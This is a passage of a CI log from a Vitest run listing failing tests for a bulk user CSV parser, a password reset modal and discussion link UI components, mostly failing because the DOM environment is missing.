2025-11-18T17:36:11.2749606Z     [90m365| [39m      
2025-11-18T17:36:11.2749961Z     [90m366| [39m      expect(lines[1]).toContain('admin');
2025-11-18T17:36:11.2750242Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.2750598Z     [90m367| [39m      expect(lines[2]).toContain('docente');
2025-11-18T17:36:11.2750784Z     [90m368| [39m    });
2025-11-18T17:36:11.2750797Z 
2025-11-18T17:36:11.2751171Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[160/545]⎯[22m[39m
2025-11-18T17:36:11.2751183Z 
2025-11-18T17:36:11.2752641Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mgenerateSampleCSV[2m > [22mshould include RUT for first 3 users
2025-11-18T17:36:11.2753572Z [31m[1mAssertionError[22m: expected '"juan.perez@ejemplo.com","Juan","Pére…' to include '11.111.111-1'[39m
2025-11-18T17:36:11.2754134Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m374:24[22m[39m
2025-11-18T17:36:11.2754487Z     [90m372| [39m      const lines = sample.split('\n');
2025-11-18T17:36:11.2754673Z     [90m373| [39m      
2025-11-18T17:36:11.2755073Z     [90m374| [39m      expect(lines[1]).toContain('11.111.111-1');
2025-11-18T17:36:11.2755370Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:11.2755957Z     [90m375| [39m      expect(lines[2]).toContain('12.345.678-5');
2025-11-18T17:36:11.2756342Z     [90m376| [39m      expect(lines[3]).toContain('5.126.663-3');
2025-11-18T17:36:11.2756356Z 
2025-11-18T17:36:11.2756728Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[161/545]⎯[22m[39m
2025-11-18T17:36:11.2756741Z 
2025-11-18T17:36:11.2758475Z [31m[1m[7m FAIL [27m[22m[39m __tests__/utils/bulkUserParser.test.ts[2m > [22mBulk User Parser Utilities[2m > [22mIntegration tests[2m > [22mshould handle complete workflow
2025-11-18T17:36:11.2758998Z [31m[1mAssertionError[22m: expected 0 to be greater than 0[39m
2025-11-18T17:36:11.2759574Z [36m [2m❯[22m __tests__/utils/bulkUserParser.test.ts:[2m389:40[22m[39m
2025-11-18T17:36:11.2760032Z     [90m387| [39m      const parseResult = parseBulkUserData(sampleCSV);
2025-11-18T17:36:11.2760225Z     [90m388| [39m      
2025-11-18T17:36:11.2760707Z     [90m389| [39m      expect(parseResult.valid.length).toBeGreaterThan(0);
2025-11-18T17:36:11.2761069Z     [90m   | [39m                                       [31m^[39m
2025-11-18T17:36:11.2761504Z     [90m390| [39m      expect(parseResult.invalid).toHaveLength(0);
2025-11-18T17:36:11.2761697Z     [90m391| [39m      
2025-11-18T17:36:11.2761711Z 
2025-11-18T17:36:11.2762082Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[162/545]⎯[22m[39m
2025-11-18T17:36:11.2762094Z 
2025-11-18T17:36:11.2763396Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould not render when isOpen is false
2025-11-18T17:36:11.2763843Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2764530Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2765150Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m38:5[22m[39m
2025-11-18T17:36:11.2765323Z     [90m 36| [39m
2025-11-18T17:36:11.2765745Z     [90m 37| [39m  it('should not render when isOpen is false', () => {
2025-11-18T17:36:11.2765987Z     [90m 38| [39m    render(
2025-11-18T17:36:11.2766223Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.2766715Z     [90m 39| [39m      <PasswordResetModal {...defaultProps} isOpen={false} />
2025-11-18T17:36:11.2767075Z     [90m 40| [39m    );
2025-11-18T17:36:11.2767091Z 
2025-11-18T17:36:11.2767468Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[163/545]⎯[22m[39m
2025-11-18T17:36:11.2767481Z 
2025-11-18T17:36:11.2768744Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould not render when user is null
2025-11-18T17:36:11.2769184Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2769872Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2770515Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m46:5[22m[39m
2025-11-18T17:36:11.2770688Z     [90m 44| [39m
2025-11-18T17:36:11.2771298Z     [90m 45| [39m  it('should not render when user is null', () => {
2025-11-18T17:36:11.2771520Z     [90m 46| [39m    render(
2025-11-18T17:36:11.2771753Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.2772200Z     [90m 47| [39m      <PasswordResetModal {...defaultProps} user={null} />
2025-11-18T17:36:11.2772386Z     [90m 48| [39m    );
2025-11-18T17:36:11.2772398Z 
2025-11-18T17:36:11.2772776Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[164/545]⎯[22m[39m
2025-11-18T17:36:11.2772787Z 
2025-11-18T17:36:11.2774068Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould render correctly when open with user
2025-11-18T17:36:11.2774502Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2775173Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2775804Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m54:5[22m[39m
2025-11-18T17:36:11.2775989Z     [90m 52| [39m
2025-11-18T17:36:11.2776448Z     [90m 53| [39m  it('should render correctly when open with user', () => {
2025-11-18T17:36:11.2777037Z     [90m 54| [39m    render(<PasswordResetModal {...defaultProps} />);
2025-11-18T17:36:11.2777281Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.2777456Z     [90m 55| [39m    
2025-11-18T17:36:11.2777733Z     [90m 56| [39m    // Check header exists
2025-11-18T17:36:11.2777919Z 
2025-11-18T17:36:11.2778297Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[165/545]⎯[22m[39m
2025-11-18T17:36:11.2778309Z 
2025-11-18T17:36:11.2779646Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error when submitting empty password
2025-11-18T17:36:11.2780680Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2781742Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2782734Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2783367Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m65:28[22m[39m
2025-11-18T17:36:11.2783543Z     [90m 63| [39m
2025-11-18T17:36:11.2784067Z     [90m 64| [39m  it('should show error when submitting empty password', async () => {
2025-11-18T17:36:11.2784393Z     [90m 65| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2784693Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2785109Z     [90m 66| [39m    render(<PasswordResetModal {...defaultProps} />);
2025-11-18T17:36:11.2785286Z     [90m 67| [39m    
2025-11-18T17:36:11.2785299Z 
2025-11-18T17:36:11.2785654Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[166/545]⎯[22m[39m
2025-11-18T17:36:11.2785667Z 
2025-11-18T17:36:11.2787064Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error when passwords do not match
2025-11-18T17:36:11.2788162Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2789278Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2790309Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2790969Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m76:28[22m[39m
2025-11-18T17:36:11.2791161Z     [90m 74| [39m
2025-11-18T17:36:11.2791679Z     [90m 75| [39m  it('should show error when passwords do not match', async () => {
2025-11-18T17:36:11.2792017Z     [90m 76| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2792571Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2793020Z     [90m 77| [39m    render(<PasswordResetModal {...defaultProps} />);
2025-11-18T17:36:11.2793215Z     [90m 78| [39m    
2025-11-18T17:36:11.2793229Z 
2025-11-18T17:36:11.2793605Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[167/545]⎯[22m[39m
2025-11-18T17:36:11.2793617Z 
2025-11-18T17:36:11.2795026Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error for password less than 6 characters
2025-11-18T17:36:11.2796064Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2797296Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2798305Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2798972Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m93:28[22m[39m
2025-11-18T17:36:11.2799147Z     [90m 91| [39m
2025-11-18T17:36:11.2799699Z     [90m 92| [39m  it('should show error for password less than 6 characters', async ()…
2025-11-18T17:36:11.2800023Z     [90m 93| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2800521Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2800970Z     [90m 94| [39m    render(<PasswordResetModal {...defaultProps} />);
2025-11-18T17:36:11.2801151Z     [90m 95| [39m    
2025-11-18T17:36:11.2801170Z 
2025-11-18T17:36:11.2801538Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[168/545]⎯[22m[39m
2025-11-18T17:36:11.2801550Z 
2025-11-18T17:36:11.2802935Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould generate random password when button is clicked
2025-11-18T17:36:11.2804004Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2805091Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2806111Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2806946Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m110:28[22m[39m
2025-11-18T17:36:11.2807152Z     [90m108| [39m
2025-11-18T17:36:11.2807725Z     [90m109| [39m  it('should generate random password when button is clicked', async (…
2025-11-18T17:36:11.2808065Z     [90m110| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2808382Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2808837Z     [90m111| [39m    render(<PasswordResetModal {...defaultProps} />);
2025-11-18T17:36:11.2809028Z     [90m112| [39m    
2025-11-18T17:36:11.2809041Z 
2025-11-18T17:36:11.2809408Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[169/545]⎯[22m[39m
2025-11-18T17:36:11.2809422Z 
2025-11-18T17:36:11.2810624Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould toggle password visibility
2025-11-18T17:36:11.2811665Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2812779Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2813784Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2814433Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m125:28[22m[39m
2025-11-18T17:36:11.2814613Z     [90m123| [39m
2025-11-18T17:36:11.2815281Z     [90m124| [39m  it('should toggle password visibility', async () => {
2025-11-18T17:36:11.2815617Z     [90m125| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2815937Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2816386Z     [90m126| [39m    render(<PasswordResetModal {...defaultProps} />);
2025-11-18T17:36:11.2816574Z     [90m127| [39m    
2025-11-18T17:36:11.2816587Z 
2025-11-18T17:36:11.2817129Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[170/545]⎯[22m[39m
2025-11-18T17:36:11.2817144Z 
2025-11-18T17:36:11.2818544Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould successfully reset password with valid inputs
2025-11-18T17:36:11.2819596Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2820679Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2821694Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2822357Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m142:28[22m[39m
2025-11-18T17:36:11.2822534Z     [90m140| [39m
2025-11-18T17:36:11.2823293Z     [90m141| [39m  it('should successfully reset password with valid inputs', async () …
2025-11-18T17:36:11.2823666Z     [90m142| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2823986Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2824506Z     [90m143| [39m    mockOnPasswordReset.mockResolvedValueOnce(undefined);
2025-11-18T17:36:11.2824682Z     [90m144| [39m    
2025-11-18T17:36:11.2824695Z 
2025-11-18T17:36:11.2825067Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[171/545]⎯[22m[39m
2025-11-18T17:36:11.2825079Z 
2025-11-18T17:36:11.2848709Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould show error when password reset fails
2025-11-18T17:36:11.2849891Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2851047Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2852127Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2852865Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m164:28[22m[39m
2025-11-18T17:36:11.2853105Z     [90m162| [39m
2025-11-18T17:36:11.2853631Z     [90m163| [39m  it('should show error when password reset fails', async () => {
2025-11-18T17:36:11.2853982Z     [90m164| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2854315Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2854745Z     [90m165| [39m    const errorMessage = 'Network error';
2025-11-18T17:36:11.2855436Z     [90m166| [39m    mockOnPasswordReset.mockRejectedValueOnce(new Error(errorMessage));
2025-11-18T17:36:11.2855459Z 
2025-11-18T17:36:11.2855909Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[172/545]⎯[22m[39m
2025-11-18T17:36:11.2855927Z 
2025-11-18T17:36:11.2857510Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould disable buttons while resetting
2025-11-18T17:36:11.2858627Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2859743Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2860769Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2861695Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m186:28[22m[39m
2025-11-18T17:36:11.2861883Z     [90m184| [39m
2025-11-18T17:36:11.2862383Z     [90m185| [39m  it('should disable buttons while resetting', async () => {
2025-11-18T17:36:11.2862737Z     [90m186| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2863074Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2863260Z     [90m187| [39m    
2025-11-18T17:36:11.2863627Z     [90m188| [39m    // Create a promise that we can control
2025-11-18T17:36:11.2863642Z 
2025-11-18T17:36:11.2864015Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[173/545]⎯[22m[39m
2025-11-18T17:36:11.2864031Z 
2025-11-18T17:36:11.2865352Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould close modal when cancel button is clicked
2025-11-18T17:36:11.2866412Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2867581Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2868662Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2869623Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m222:28[22m[39m
2025-11-18T17:36:11.2869866Z     [90m220| [39m
2025-11-18T17:36:11.2870461Z     [90m221| [39m  it('should close modal when cancel button is clicked', async () => {
2025-11-18T17:36:11.2870859Z     [90m222| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2871218Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2871718Z     [90m223| [39m    render(<PasswordResetModal {...defaultProps} />);
2025-11-18T17:36:11.2871936Z     [90m224| [39m    
2025-11-18T17:36:11.2871970Z 
2025-11-18T17:36:11.2872379Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[174/545]⎯[22m[39m
2025-11-18T17:36:11.2872392Z 
2025-11-18T17:36:11.2873745Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx[2m > [22mPasswordResetModal[2m > [22mshould close modal when X button is clicked
2025-11-18T17:36:11.2874895Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2876022Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2884729Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2885496Z [36m [2m❯[22m components/__tests__/PasswordResetModal.test.tsx:[2m232:28[22m[39m
2025-11-18T17:36:11.2885697Z     [90m230| [39m
2025-11-18T17:36:11.2886209Z     [90m231| [39m  it('should close modal when X button is clicked', async () => {
2025-11-18T17:36:11.2886566Z     [90m232| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.2887090Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.2887556Z     [90m233| [39m    render(<PasswordResetModal {...defaultProps} />);
2025-11-18T17:36:11.2887747Z     [90m234| [39m    
2025-11-18T17:36:11.2887763Z 
2025-11-18T17:36:11.2888156Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[175/545]⎯[22m[39m
2025-11-18T17:36:11.2888172Z 
2025-11-18T17:36:11.2889888Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould display comment count with proper styling when comments exist
2025-11-18T17:36:11.2890334Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2891098Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2891968Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m67:7[22m[39m
2025-11-18T17:36:11.2892319Z     [90m 65| [39m  describe('Visual Display', () => {
2025-11-18T17:36:11.2892889Z     [90m 66| [39m    it('should display comment count with proper styling when comments…
2025-11-18T17:36:11.2893132Z     [90m 67| [39m      render(
2025-11-18T17:36:11.2893369Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2893674Z     [90m 68| [39m        <MockAssignmentCard
2025-11-18T17:36:11.2894023Z     [90m 69| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.2894038Z 
2025-11-18T17:36:11.2894419Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[176/545]⎯[22m[39m
2025-11-18T17:36:11.2894442Z 
2025-11-18T17:36:11.2895967Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould display zero comments with gray styling
2025-11-18T17:36:11.2896541Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2897613Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2898274Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m82:7[22m[39m
2025-11-18T17:36:11.2898496Z     [90m 80| [39m
2025-11-18T17:36:11.2899023Z     [90m 81| [39m    it('should display zero comments with gray styling', () => {
2025-11-18T17:36:11.2899586Z     [90m 82| [39m      render(
2025-11-18T17:36:11.2899861Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2900198Z     [90m 83| [39m        <MockAssignmentCard
2025-11-18T17:36:11.2900665Z     [90m 84| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.2900683Z 
2025-11-18T17:36:11.2901103Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[177/545]⎯[22m[39m
2025-11-18T17:36:11.2901132Z 
2025-11-18T17:36:11.2902624Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould use singular form for 1 comment
2025-11-18T17:36:11.2903115Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2904027Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2904686Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m97:7[22m[39m
2025-11-18T17:36:11.2904912Z     [90m 95| [39m
2025-11-18T17:36:11.2905399Z     [90m 96| [39m    it('should use singular form for 1 comment', () => {
2025-11-18T17:36:11.2905646Z     [90m 97| [39m      render(
2025-11-18T17:36:11.2905893Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2906203Z     [90m 98| [39m        <MockAssignmentCard
2025-11-18T17:36:11.2906552Z     [90m 99| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.2906570Z 
2025-11-18T17:36:11.2907210Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[178/545]⎯[22m[39m
2025-11-18T17:36:11.2907229Z 
2025-11-18T17:36:11.2908618Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould show chat icon
2025-11-18T17:36:11.2909118Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2909880Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2910534Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m111:7[22m[39m
2025-11-18T17:36:11.2910765Z     [90m109| [39m
2025-11-18T17:36:11.2911156Z     [90m110| [39m    it('should show chat icon', () => {
2025-11-18T17:36:11.2911424Z     [90m111| [39m      render(
2025-11-18T17:36:11.2911667Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.2911969Z     [90m112| [39m        <MockAssignmentCard
2025-11-18T17:36:11.2912398Z     [90m113| [39m          assignment={mockAssignment}
2025-11-18T17:36:11.2912412Z 
2025-11-18T17:36:11.2912810Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[179/545]⎯[22m[39m
2025-11-18T17:36:11.2912825Z 
2025-11-18T17:36:11.2914828Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mClick Interactions[2m > [22mshould call onDiscussionClick when discussion link is clicked
2025-11-18T17:36:11.2915932Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.2917321Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.2918440Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.2919106Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m129:30[22m[39m
2025-11-18T17:36:11.2919723Z     [90m127| [39m      const onDiscussionClick = vi.fn((e) => e.stopPropagation());
2025-11-18T17:36:11.2920126Z     [90m128| [39m      const onAssignmentClick = vi.fn();
2025-11-18T17:36:11.2920485Z     [90m129| [39m      const user = userEvent.setup();
2025-11-18T17:36:11.2920799Z     [90m   | [39m                             [31m^[39m
2025-11-18T17:36:11.2920971Z     [90m130| [39m
2025-11-18T17:36:11.2921200Z     [90m131| [39m      render(
2025-11-18T17:36:11.2921213Z 
2025-11-18T17:36:11.2921592Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[180/545]⎯[22m[39m
2025-11-18T17:36:11.2921606Z 
2025-11-18T17:36:11.2923639Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mClick Interactions[2m > [22mshould not trigger assignment click when discussion link is clicked
2025-11-18T17:36:11.2924198Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.2925022Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.2925631Z [36m [2m❯[22m tests/workspace/discussionLinkUI.test.tsx:[2m151:7[22m[39m
2025-11-18T17:36:11.2926020Z     [90m149| [39m      const onAssignmentClick = vi.fn();
2025-11-18T17:36:11.2926202Z     [90m150| [39m
2025-11-18T17:36:11.2926456Z     [90m151| [39m      render(
2025-11-18T17:36:11.2926738Z     [90m   | [39m      [31m^[39m
